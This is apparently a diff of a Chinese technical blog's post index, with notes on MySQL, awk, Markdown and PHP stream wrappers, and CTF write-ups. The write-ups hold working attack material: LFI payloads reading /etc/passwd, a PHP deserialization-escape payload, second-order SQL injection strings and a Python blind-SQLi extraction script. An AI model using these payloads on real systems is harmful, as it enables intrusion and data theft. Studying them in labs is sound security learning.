-M最大为65
-D最大为30
-
-
-注意:DECIMAL类型的存储空间是可变的,它的存储大小受DECIMAL数据类型定义时指定的精度和规模影响。如果D小数位数为0,DECIMAL则值不包含小数点或小数部分。例：emp_salary DECIMAL(8,1) COMMENT ‘工资,小数加整数一共8位,保留一位小数,多位会四舍五入’
-
-3. 字符类型
-
-
-类型
-特点
-长度范围（字符）
-
-
-
-char(n)
-固定长度
-0&#x3D;&lt;n&lt;&#x3D;255
-
-
-varchar(n)
-可变长度
-0&#x3D;&lt;n&lt;&#x3D;65535
-
-
-text
-长文本
-0~65535
-
-
-tinytext
-微短文本
-0~255
-
-
-tinyblob
-微短二进制文本
-0~255
-
-
-blob
-二进制文本
-0~65535
-
-
-注意:
-varchar定义时，必须指定最大长度，否则会报错。char定义时，如果不指定最大长度，默认会指定最大长度为1。
-字符类型在存储时，如果数据长度小于最大长度，会在末尾填充空格。
-blob类型是一个二进制大对象，可以容纳可变数量的数据。
-
-4. 日期和时间类型
-
-
-类型
-大小（bytes）
-格式
-范围
-用途
-
-
-
-date
-3
-YYYY-MM-DD
-1000-01-01~9999-12-31
-日期值
-
-
-time
-3
-HH:mm:ss
--838:59:59~838:59:59
-时间值
-
-
-datetime
-8
-YYYY-MM-DD HH:mm:ss
-1000-01-01 00:00:00 到 9999-12-31 23:59:59
-日期时间值混合
-
-
-year
-1
-YYYY
-1901~2155
-年分值
-
-
-timestamp
-4
-YYYY-DD HH:mm:ss
-1970-01-01 00:00:00 到 2038-01-19 03:14:07
-年分值
-
-
-注意:
-year类型有两位或者四位的表达形式,两位 00-69 &#x3D;2000-2069 70-99&#x3D;1970-1999
-时间类型就是一个特殊格式的字符串,插入数据的时候!,时间类型需要自动赋值,需要手动添加相关的设置
-
-扩展自动填写时间:
-插入默认添加时间
-
-datetime default current_timestamp ;
-
-修改默认更改时间(插入的默认时间)
-
-datetime default current_timestamp on update current_timestamp;
-实例：ACREATE TABLE t2(NAME VARCHAR (20),register_time DATETIME DEFAULT CURRENT_TIMESTAMP COMMENT&#x27;插入自动维护时间&#x27;,update_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT &#x27;插入维护时间,修改数据自动维护时间&#x27;)
-
-创建t2表:注册日期 字段插入自动添加时间,更新数据不变(插入数据的时候,自动维护时间,后续修改数据,时间不变!)更新日期 字段插入自动添加时间,更新数据时间改变(插入数据需要自动维护时间,修改数据也需要维护时间!)
-六. 表的修改和删除1. 添加列alter table 表名 add 列名 类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
-2. 删除列alter table 表名 drop 列名;
-3. 修改列名alter table 表名 change 原列名 新列名 新类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
-4. 修改列类型alter table 表名 modify 列名 新类型 [列可选约束][COMMENT &#x27;列可选注释&#x27;][first | after 原列名];
-5. 修改表名alter table 表名 rename 新表名;
-6. 删除表drop table [if exists] 表名;
-7. 清除表数据truncate table 表名;
-]]></content>
-      <tags>
-        <tag>MySQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>awk脚本的语法</title>
-    <url>/2026/03/25/awk%E8%84%9A%E6%9C%AC%E7%9A%84%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[如何调用脚本一. 使用 -f 选项运行脚本将 awk 命令写入一个文本文件（例如 my.awk），然后用 -f 调用：awk -f my.awk 输入文件1 [输入文件2 ...]
-示例脚本 my.awk:BEGIN &#123; print &quot;开始处理&quot; &#125;&#123; print &quot;行号:&quot; NR, &quot;内容:&quot; $0 &#125;END &#123; print &quot;处理完成&quot; &#125;
-运行：awk -f my.awk data.txt
-二. 让 awk 脚本直接可执行（shebang）在脚本文件的第一行添加 #!&#x2F;usr&#x2F;bin&#x2F;awk -f，然后赋予执行权限。示例脚本 count.awk：#!/usr/bin/awk -f# 统计非空行数量BEGIN &#123; count = 0 &#125;NF &gt; 0 &#123; count++ &#125;END &#123; print &quot;非空行数:&quot;, count &#125;
-赋予权限并运行：chmod +x count.awk./count.awk data.txt
-注意：shebang 中 awk 的路径是 &#x2F;usr&#x2F;bin&#x2F;awk，也可用 #!&#x2F;usr&#x2F;bin&#x2F;env awk -f 以增强可移植性。三. 在脚本中处理多个文件awk -f script.awk file1.txt file2.txt
-
-四. 向脚本传递变量使用 -v 选项可以在脚本执行前定义变量：awk -f script.awk -v threshold=100 data.txt
-脚本内可直接使用 threshold。五. 结合其他选项
-指定字段分隔符：awk -F, -f script.awk data.csv
-使用多个脚本文件：可以多次使用 -f，如 awk -f common.awk -f main.awk data.txt
-
-六.调试与注意事项
-语法检查：可用 awk -f script.awk –source ‘BEGIN{exit}’ 简单检查，或使用 gawk –lint -f script.awk。
-脚本中的注释：以 # 开头，直到行末。
-换行与分号：语句之间可用分号分隔，也可换行。
-函数定义：支持自定义函数，放在脚本中适当位置。
-
-awk脚本的结构和语法一.脚本的基本结构BEGIN &#123; 初始化操作 &#125;            # 在处理任何输入行之前执行/正则/ &#123; 匹配时执行的动作 &#125;     # 匹配正则的行条件表达式 &#123; 动作 &#125;             # 条件为真时执行END &#123; 汇总操作 &#125;               # 所有输入行处理完后执行
-示例：BEGIN &#123; FS=&quot;:&quot;; print &quot;开始处理&quot; &#125;$3 &gt;= 1000 &#123; print $1, $3 &#125;END &#123; print &quot;处理完成&quot; &#125;
-二.变量与内置变量内置变量（部分）
-
-
-变量
-含义
-
-
-
-$0
-当前整行
-
-
-$n
-第n个字段
-
-
-NF
-当前行字段数
-
-
-NR
-当前行号（所有文件累计）
-
-
-FNR
-当前文件内行号
-
-
-FS
-输入字段分隔符（默认空格或制表符）
-
-
-OFS
-输出字段分隔符（默认空格）
-
-
-RS
-输入记录分隔符（默认换行）
-
-
-ORS
-输出记录分隔符（默认换行）
-
-
-ARGC, ARGV
-命令行参数数组
-
-
-FILENAME
-当前输入文件名
-
-
-三.用户自定义变量变量名由字母、数字、下划线组成，区分大小写，无需显式声明，默认值为空字符串或0。BEGIN &#123; count = 0 &#125;&#123; count++ &#125;END &#123; print &quot;总行数:&quot;, count &#125;
-运算符
-算术：+、 -、 *、 &#x2F;、 %、 ^（^ 为乘方）
-
-字符串连接：空格, “a” “b” 得 “ab”
-
-赋值：&#x3D;、 +&#x3D;、 -&#x3D;、 *&#x3D;、 &#x2F;&#x3D;、 %&#x3D;、 ^&#x3D;
-
-比较：&#x3D;&#x3D;、 !&#x3D;、 &gt;、 &lt;、 &gt;&#x3D;、 &lt;&#x3D;（字符串比较按字典序）
-
-逻辑：&amp;&amp;、||、!
-
-三元：条件 ? 表达式1 : 表达式2
-
-
-四.控制语句if-elseif (条件) &#123;    语句&#125; else if (条件) &#123;    语句&#125; else &#123;    语句&#125;
-while&#x2F;do-whilewhile (条件) 语句do 语句 while (条件)
-for循环for (初始化; 条件; 迭代) 语句for (i in 数组) 语句   # 遍历数组下标
-未完待续
-]]></content>
-      <tags>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>markdown语法</title>
-    <url>/2026/03/28/markdown%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[一.Markdown标题语法要创建标题，请在单词或短语前面添加井号 (#) 。# 的数量代表了标题的级别。
-#一级标题##二级标题###三级标题####四级标题
-二.Markdownd段落语法创建段落，要使用空白行将一行或多行文本进行分隔。
-段落a
-段落b
-段落c
-
-注意：（不要用空格或制表符（ tabs）缩进段落。）三.Markdown的换行语法在一行的末尾添加两个或多个空格，然后按回车键,即可创建一个换行。（为了兼容性，可以在行尾添加“结尾空格”或 HTML 的 &lt;br&gt; 标签来实现换行。）
-
-四.Markdown的强调语法粗体
-
-
-语法
-文本
-预览
-
-
-
-**  **
-**粗体**字符
-粗体字符
-
-
-__  __（不建议）
-__粗体__字符
-粗体字符
-
-
-斜体
-
-
-语法
-文本
-预览
-
-
-
-*  *
-*斜体*字符
-斜体字符
-
-
-_  _（不建议）
-_斜体_字符
-斜体字符
-
-
-粗体加斜体
-
-
-语法
-文本
-预览
-
-
-
-***  ***
-***粗斜***字符
-粗斜字符
-
-
-___  ___
-___粗斜___字符
-粗斜字符
-
-
-五.Markdown引用语法要创建块引用，请在段落前添加一个 &gt; 符号。
-这是一个块引用
-块引用可以包含多个段落，每个段落前都需要添加 &gt; 符号。
-
-嵌套块引用
-这是一个块引用
-
-这是一个嵌套的块引用
-
-这是一个更深层的嵌套块引用
-
-
-
-六.Markdown列表语法无序列表要创建无序列表，请在每个列表项前添加破折号 (-)、星号 (*) 或加号 (+) 。
-
-
-列表项 1
-列表项 2
-列表项 3
-
-
-有序列表要创建有序列表，请在每个列表项前添加数字和一个英文句点。
-
-第一个列表项
-第二个列表项
-第三个列表项
-
-
-嵌套列表
-
-第一个列表项
-嵌套的无序列表项
-嵌套的无序列表项
-
-
-第二个列表项
-嵌套的有序列表项
-嵌套的有序列表项
-
-
-
-
-七.Markdown代码语法行内代码要将单词或短语表示为代码，请将其包裹在反引号 (`) 中。
-
-这是 行内代码 示例
-代码块要创建代码块，请将代码块的每一行都缩进至少四个空格或一个制表符。
-function hello() &#123;    console.log(&quot;Hello, Markdown!&quot;);&#125;
-
-或者可以使用三个反引号 (```) 来创建代码块，这是更常用的方法：
-function hello() &#123;    console.log(&quot;Hello, Markdown!&quot;);&#125;
-
-八.Markdown分隔线语法要创建分隔线，请在单独一行上使用三个或更多的星号 (***)、破折号 (---) 或下划线 (___) ，并且不能包含其他内容。
-
-
-
-
-
-九.Markdown链接语法基本链接要创建链接，请使用方括号 [] 包裹链接文本，后面跟着圆括号 () 包裹链接地址。
-[文本](网址)
-百度
-
-带标题的链接还可以在链接地址后面添加可选的标题，用引号包裹。
-[文本](网址 “标题”)
-百度
-
-引用样式链接引用样式链接由两部分组成：
-&gt;[文本1](网址1 “标题1”)&gt;[文本2](网址2 “标题2”)
-百度Google
-
-十.Markdown图片语法基本图片要添加图片，请使用感叹号 (!)，后跟方括号 [] 包裹替代文本，然后是圆括号 () 包裹图片链接。
-![示例图片](图片地址)
-带标题的图片您还可以在图片链接后面添加可选的标题，用引号包裹。
-
-![示例图片](图片地址 “图片标题”)
-引用样式图片与链接类似，图片也可以使用引用样式：
-
-![示例图片](图片地址 “图片标题”)
-十一.Markdown转义字符语法要显示原本用于格式化 Markdown 文档的特殊字符，请在字符前添加反斜杠 (\)。
-* 这不是斜体文本 *# 这不是标题[ 这不是链接开始
-]]></content>
-      <tags>
-        <tag>markdown</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php伪协议</title>
-    <url>/2026/05/05/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[php伪协议的作用
-PHP 内置了多种 流封装器（Stream Wrappers），用于处理不同的输入&#x2F;输出方式。它们像“协议”一样，允许你用 协议名:&#x2F;&#x2F; 的格式访问各种数据源。
-
-常见的php伪协议
-
-
-伪协议
-作用
-
-
-
-file://
-访问本地文件系统（默认）
-
-
-http:// &#x2F; https://
-访问 HTTP 网络资源
-
-
-php://input
-读取原始 POST 数据（常用于 getshell）
-
-
-php://filter
-对本地文件进行读&#x2F;写时应用过滤器
-
-
-php://stdin &#x2F; php://stdout
-标准输入&#x2F;输出流
-
-
-data://
-将 base64 或纯文本当作文件处理
-
-
-zip:// &#x2F; phar://
-访问压缩包内的文件
-
-
-?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php的结构php://filter/convert.base64-encode/resource=index.php│            │                       │└─主协议     └─过滤器                 └─目标资源（要读取的文件）
-
-php:&#x2F;&#x2F;filter：固定协议头。
-
-convert.base64-encode：过滤器，告诉 PHP 在读取文件内容后，对数据进行 base64_encode() 编码。
-
-resource&#x3D;index.php：目标文件，即要读取的原始文件路径。
-
-
-base64 编码的作用
-如果不加过滤器，当 include 或 require 包含一个 PHP 文件时，PHP 会 直接执行该文件中的 PHP 代码，而不是返回源代码。例如 include(‘index.php’) 会运行 index.php 里的逻辑，无法看到其中的 PHP 标签内的内容。而 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode 会把 文件原始内容（包括  标签）视为字符串，进行 base64 编码后再交给 include。由于 base64 编码后的内容不包含 &lt;?php 标签，PHP 不会执行它，只会输出编码后的字符串。收到该字符串后手动解码，就可以得到完整的源码。
-
-使用场景
-本地文件包含（LFI）漏洞的利用
-
-
-目标存在 include($_GET[‘page’]) 或 file_get_contents($_GET[‘file’]) 等函数。
-
-想读取源码（而不是执行），就用 php:&#x2F;&#x2F;filter。
-
-如果想执行任意 PHP 代码，可以用 php:&#x2F;&#x2F;input、data:&#x2F;&#x2F;、phar:&#x2F;&#x2F; 等。
-
-
-
-绕过文件扩展名限制
-
-
-有些程序会自动拼接后缀（如 .php），php:&#x2F;&#x2F;filter 不受后缀影响（因为过滤器本身不依赖扩展名）。
-
-例如：?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 可以直接读取 &#x2F;etc&#x2F;passwd。
-
-
-
-多过滤器链式处理
-
-
-可以叠加多个过滤器，例如：php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode|convert.base64-decode&#x2F;resource&#x3D;index.php（先编码再解码，最后得到原始内容，有时用于绕过 WAF）
-
-]]></content>
-      <tags>
-        <tag>php伪协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入二</title>
-    <url>/2026/04/22/sql%E6%B3%A8%E5%85%A5%E4%BA%8C/</url>
-    <content><![CDATA[一.Post注入步骤1. 一开始先用admin万能账号与and或任意字符与or判断闭合方式和注点2. 账号和密码之间的post数据用&amp;连接起来，且都必填，如果有submit传输，则要连接submit的值3. 之后在账号或密码中注入sql语句，方式与之前字符型注入相同4. post注入一般是报错注入或盲注实例
-二.Uagent请求头注入适用场景
-网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时uagent请求头未被过滤或拦截。
-步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的uagent请求头3. 发送请求包，查看响应结果4.一般为报错注入实例
-三.Refer请求头注入与Uagent请求头注入相同适用场景
-网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时refer请求头未被过滤或拦截。
-步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的refer请求头3. 发送请求包，查看响应结果4.一般为报错注入四.cookie注入适用场景
-网站后台用check_input函数对账号和密码进行过滤，以字符的形式入数据库，而不是以命令的形式进行查询，导致无法注入sql语句。同时cookie未被过滤或拦截。
-步骤1. 用burpuite抓包，找到请求包2. 修改请求包的headers部分的cookie3. 发送请求包，查看响应结果4.一般为报错注入实例
-]]></content>
-  </entry>
-  <entry>
-    <title>[安洵杯 2019] easy_serialize_php 反序列化字符逃逸</title>
-    <url>/2026/05/17/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</url>
-    <content><![CDATA[1 题目描述打开题目页面，只有一个 “source_code” 链接，点击可以看到源代码。
-2 代码审计访问 ?f=highlight_file 获取源代码：
-&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123;    $filter_arr = array(&#x27;php&#x27;, &#x27;flag&#x27;, &#x27;php5&#x27;, &#x27;php4&#x27;, &#x27;fl1g&#x27;);    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;, $filter_arr).&#x27;/i&#x27;;    return preg_replace($filter, &#x27;&#x27;, $img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);  // 变量覆盖漏洞！if(!$_GET[&#x27;img_path&#x27;])&#123;    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123;    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123;    highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123;    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123;    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125;?&gt;
-
-关键函数分析1. filter() 过滤函数
-过滤关键字：php、flag、php5、php4、fl1g，使用 preg_replace 将它们替换为空字符串。
-2. extract($_POST) 变量覆盖
-extract() 函数将 POST 数组中的键值对提取为 PHP 变量，这意味着可以通过 POST 覆盖前面的 $_SESSION[&#39;user&#39;]、$_SESSION[&#39;function&#39;]变量。
-3. show_image 功能
-当 $function == &#39;show_image&#39; 时，会反序列化经过 filter 处理的 session 数据，然后读取 $userinfo[&#39;img&#39;] base64 解码后的文件路径。
-3 信息收集 — phpinfo访问 ?f=phpinfo，在 phpinfo 页面中发现关键信息：
-
-auto_append_file: d0g3_f1ag.php — 存在可疑 PHP 文件
-FLAG: not_flag — 不是真正的 flag
-
-由此可知 flag 很可能就在 d0g3_f1ag.php 文件中。
-4 反序列化字符逃逸原理核心漏洞点filter() 函数会对 serialize($_SESSION) 的序列化字符串进行关键字过滤，而过滤后的字符串会被 unserialize() 反序列化。
-当 filter 删除了序列化字符串中的字符，但长度标识（s:N）没有相应更新时，就会导致反序列化解析错位，从而实现字符逃逸。
-三种 POST 方式实现逃逸参考文章中给出了三种 POST 传参方式，均可以实现字符逃逸，可对比学习规律：
-方法一：利用键名 flagflag
-_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-序列化后：a:1:{s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;}&quot;，filter 删除两个 “flag” 后键名变为空，s:8 向后吞并，注入的 img 键值对被解析。
-方法二：利用键名 flagphp
-_SESSION[flagphp]=;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-filter 删除 “php,flag” 后键名变化，同样造成逃逸。
-5 构造 Payload 获取 Flag第一步：读取 d0g3_f1ag.phpd0g3_f1ag.php 的 base64 编码：
-d0g3_f1ag.php -&gt; base64_encode = ZDBnM19mMWFnLnBocA==
-
-构造 payload，利用 extract($_POST) 覆盖 $_SESSION[&#39;user&#39;]、$_SESSION[&#39;function&#39;]变量和使后面的 $_SESSION[&#39;img&#39;]变量逃逸：
-通过字符逃逸，原本代码中设置的 img 值（guest_img.png 的 base64或sha1(base64_encode($_GET[&#39;img_path&#39;]))）被忽略，注入的 ZDBnM19mMWFnLnBocA== 成为了 img 的值。
-发送请求：
-GET /index.php?f=show_imagePOST: _SESSION[flagphp] =;s:3:&quot;666&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
-
-查看返回结果页面源代码：
-&lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt;
-
-成功读取到 d0g3_f1ag.php 文件！其中提示 flag 在 /d0g3_fllllllag 文件中。
-第二步：读取 &#x2F;d0g3_fllllllag 获取 Flag/d0g3_fllllllag 的 base64 编码：
-/d0g3_fllllllag -&gt; base64_encode = L2QwZzNfZmxsbGxsbGFn
-
-构造相同结构的 payload，只替换 base64 字符串：
-GET /index.php?f=show_imagePOST: _SESSION[flagphp] =;s:3:&quot;666&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;
-
-最终获取 flag：
-6 知识点总结
-extract() 变量覆盖 — 通过 POST 数据覆盖 $_SESSION、$function、$_GET 等变量
-反序列化字符逃逸 — 利用 filter 删除关键字导致的序列化字符串长度与内容不匹配，实现反序列化注入
-PHP 反序列化容错性 — PHP 反序列化时能自动跳过无效字符继续解析，这为注入提供了可能
-
-字符逃逸的通用思路当序列化字符串经过替换&#x2F;过滤操作后，长度发生变化时：
-
-替换后变短(本题)：利用长度标识 &gt; 实际内容，向后吞并其他字段
-替换后变长：利用转义字符导致闭合提前
-
-]]></content>
-      <tags>
-        <tag>解题wp</tag>
-        <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>php魔术方法</title>
     <url>/2026/05/09/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
     <content><![CDATA[一.__construct() – 构造函数1.一、定义与触发条件__construct() 是 PHP 类中最常见的魔术方法，在使用 new 关键字实例化对象时自动调用。它通常用于初始化对象的属性、建立数据库连接等。触发 __construct() 的情况：
@@ -2092,9 +1930,266 @@ if(条件,条件为true时返回值,条件为false时返回值)
       </tags>
   </entry>
   <entry>
+    <title>php伪协议</title>
+    <url>/2026/05/05/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[php伪协议的作用
+PHP 内置了多种 流封装器（Stream Wrappers），用于处理不同的输入&#x2F;输出方式。它们像“协议”一样，允许你用 协议名:&#x2F;&#x2F; 的格式访问各种数据源。
+
+常见的php伪协议
+
+
+伪协议
+作用
+
+
+
+file://
+访问本地文件系统（默认）
+
+
+http:// &#x2F; https://
+访问 HTTP 网络资源
+
+
+php://input
+读取原始 POST 数据（常用于 getshell）
+
+
+php://filter
+对本地文件进行读&#x2F;写时应用过滤器
+
+
+php://stdin &#x2F; php://stdout
+标准输入&#x2F;输出流
+
+
+data://
+将 base64 或纯文本当作文件处理
+
+
+zip:// &#x2F; phar://
+访问压缩包内的文件
+
+
+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php的结构php://filter/convert.base64-encode/resource=index.php│            │                       │└─主协议     └─过滤器                 └─目标资源（要读取的文件）
+
+php:&#x2F;&#x2F;filter：固定协议头。
+
+convert.base64-encode：过滤器，告诉 PHP 在读取文件内容后，对数据进行 base64_encode() 编码。
+
+resource&#x3D;index.php：目标文件，即要读取的原始文件路径。
+
+
+base64 编码的作用
+如果不加过滤器，当 include 或 require 包含一个 PHP 文件时，PHP 会 直接执行该文件中的 PHP 代码，而不是返回源代码。例如 include(‘index.php’) 会运行 index.php 里的逻辑，无法看到其中的 PHP 标签内的内容。而 php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode 会把 文件原始内容（包括  标签）视为字符串，进行 base64 编码后再交给 include。由于 base64 编码后的内容不包含 &lt;?php 标签，PHP 不会执行它，只会输出编码后的字符串。收到该字符串后手动解码，就可以得到完整的源码。
+
+使用场景
+本地文件包含（LFI）漏洞的利用
+
+
+目标存在 include($_GET[‘page’]) 或 file_get_contents($_GET[‘file’]) 等函数。
+
+想读取源码（而不是执行），就用 php:&#x2F;&#x2F;filter。
+
+如果想执行任意 PHP 代码，可以用 php:&#x2F;&#x2F;input、data:&#x2F;&#x2F;、phar:&#x2F;&#x2F; 等。
+
+
+
+绕过文件扩展名限制
+
+
+有些程序会自动拼接后缀（如 .php），php:&#x2F;&#x2F;filter 不受后缀影响（因为过滤器本身不依赖扩展名）。
+
+例如：?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 可以直接读取 &#x2F;etc&#x2F;passwd。
+
+
+
+多过滤器链式处理
+
+
+可以叠加多个过滤器，例如：php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode|convert.base64-decode&#x2F;resource&#x3D;index.php（先编码再解码，最后得到原始内容，有时用于绕过 WAF）
+
+]]></content>
+      <tags>
+        <tag>php伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入题目合集</title>
+    <url>/2026/05/01/sql%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[一.[极客大挑战 2019]BabySQL 基础的注入题目一开始先使用万能密码1‘ or 1&#x3D;1查看登录成功后的回显位置
+这里报错可判断出or被过滤了，再尝试双写绕过过滤
+这里登录成功了，说明可用双写绕过，再查看列数和回显
+这里报错判断select或union或都被过滤了，再使用双写绕过过滤
+查看出列数为3列，注点为2和3。这道题会显示报错，先出尝试使用报错注入。注入途中发现substr,from,information,where也被过滤，使用双写绕过。
+最后注入成功，查看出表名，然后依次查找出列名，列里的flag
+最后使用substr函数提取出完整的flag
+二.[极客大挑战 2019]LoveSQL 基础的注入题目原理与babysql一样，不过没有函数过滤，不需要双写绕过，直接报错注入即可拿到flag三.[CISCN2019 华北赛区 Day2 Web1]Hack World开局先用1‘ or 1&#x3D;1万能账号查看，发现有sql语句过滤机制
+用sql字典爆破查看被过滤的sql语句，发现空格,&#x2F;**&#x2F;,or,and,–+,#,union,还有一些报错注入的函数都被过滤了，无法使用联合注入和报错注入，优先考虑盲注
+因or和and被过滤，所以可使用异或符^来判断页面两种不同的状态
+因为真为1，假为0，且1^1&#x3D;0，1^0&#x3D;1,所以括号中条件为真时，页面输出Error Occured When Fetch Result.当括号中条件为假时，页面输出Hello, glzjin wants a girlfriend.可根据这两种输出盲注写出盲注脚本import requestsimport timeurl = &quot;http://9fa0f800-14a7-4413-a377-9a5266bf3592.node5.buuoj.cn:81/index.php&quot;result = &quot;&quot;session = requests.Session()for i in range(1, 1000):    found = False    for ascii_val in range(32, 127):          payload = f&quot;1^(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))=&#123;ascii_val&#125;)&quot;        data = &#123;&quot;id&quot;: payload&#125;        r = session.post(url, data=data)        time.sleep(0.1)        if &quot;Error&quot; in r.text:            result += chr(ascii_val)            print(result)            found = True            break    if not found:        break    print(f&quot;Flag 获取完成: &#123;result&#125;&quot;)
+注意1. 脚本中使用了time.sleep(0.1)，是为了避免请求频率过高，导致服务器繁忙请求失败，从而使得到的flag残缺2. 脚本中使用了session.Session()是为了保持会话状态，避免每次请求都重新登录，导致注入失败执行脚本，获取flag
+四.[b01lers2020]Life on Mars进入题目后无法直接获取get或post参数的变量名，抓包查看信息
+发现get参数search，且只要地址正确，就会返回以下页面、
+用order by注入查看字段数,发现字段为2时，页面正常显示
+再使用union联合注入查看回显位置
+发现回显位置在最末尾，再查看所有库名
+选择一个库，依次查看表名，列名和列内容
+这里刚好得到了flag，如果没有就换一个库或列继续查找五.October 2019 Twice SQL Injection考察知识
+二次注入
+
+先随便注册一个账号，进行登录，输入sql语句查看过滤情况，发现没有过滤，但是单引号用\转义了，初步判断为二次注入
+尝试注册用户名为：1’ union select database()# 的账号，登录后发现回显数据库名
+进一步注入，注册用户名为：1’ union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()# 的账号，登录后回显表名
+把sql注入语句注册为用户名，依次查找列名和列内容，最终获取flag
+六.[CISCN2019 华北赛区 Day1 Web5]CyberPunk考察知识
+二次注入，php伪协议
+
+先查看源码，发现页面源代码末尾有提示file传参
+使用php伪协议读取php文件源码的base64编码,再解码
+依次拿到提交订单，修改订单，查看订单，删除订单的php源码，发现修改订单的代码中存在注入漏洞
+$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];#old_address没有被过滤，直接作用再sql语句中，所以可以在address中注入sql语句，然后通过修改订单使sql语句生效，最后通过查看订单回显sql语句的执行结果
+查看库名
+在地址中输入：’,’address’&#x3D;(select group_concat(schema_name) from information_schema.schemata)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+
+查看ctftraining库的表名
+在地址中输入：’,’address’&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctftraining’)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+
+查看列名
+在地址中输入：’,’address’&#x3D;(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’ctftraining’ and table_name&#x3D;’FLAG_TABLE’)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+
+查看列内容
+在地址中输入：’,’address’&#x3D;(select * from FLAG_COLUMN)#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+发现值为空，没有flag，被骗了，再尝试查看文件目录是否有flag文件
+在地址中输入：’,’address’&#x3D;(select(load_file(‘&#x2F;flag.txt’)))#再修改地址使sql语句生效，最后查看订单回显sql执行结果
+
+
+最终获取flag七.[GYCTF2020]Ezsqli 无列名注入考察知识
+布尔盲注，无列名注入
+
+思路1. 先输入1‘，1“，只返回了bool(false),并没有具体的报错信息，所以报错应该不回显，排除报错注入2. 依次输入id&#x3D;1，id&#x3D;2,id&#x3D;3,id&#x3D;0.发现id&#x3D;1时返回NULL,id&#x3D;2时返回V&amp;N,id&gt;&#x3D;3或&lt;&#x3D;0时返回Error Occured When Fetch Result.可用布尔盲注3. 用sql字典爆破出被过滤的字符，发现if,union,or,and，information等字符被过滤了，还可以用^异或来进行布尔盲注4. information_schema无法使用，可以用sys.schema_table_statistics_with_buffer库和sys.x$schema_flattened_keys库代替来查找表名，效果与imformation_schema.tables库相同5. 但是无法查找列名，所以用无列名注入法，查找列的内容，这里用到了ascii位偏移
+
